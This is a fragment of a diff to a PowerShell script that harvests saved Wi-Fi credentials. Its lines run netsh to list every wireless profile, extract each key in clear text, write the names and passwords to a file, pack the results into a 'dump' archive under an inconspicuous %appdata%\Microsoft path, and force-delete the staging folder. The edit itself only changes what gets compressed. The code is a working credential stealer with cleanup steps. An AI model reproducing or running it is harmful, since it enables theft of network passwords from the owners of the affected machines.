@@ -15,5 +15,5 @@ dir *.xml |% {
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > .\wifipass2.txt
 
 Set-Location ..
-Compress-Archive -Path * -DestinationPath "$dump_file_name"
+Compress-Archive -Path .\wifi_data -DestinationPath "$dump_file_name"
 Remove-Item -Path "$env:appdata\Microsoft\dump\wifi_data" -recurse -Force
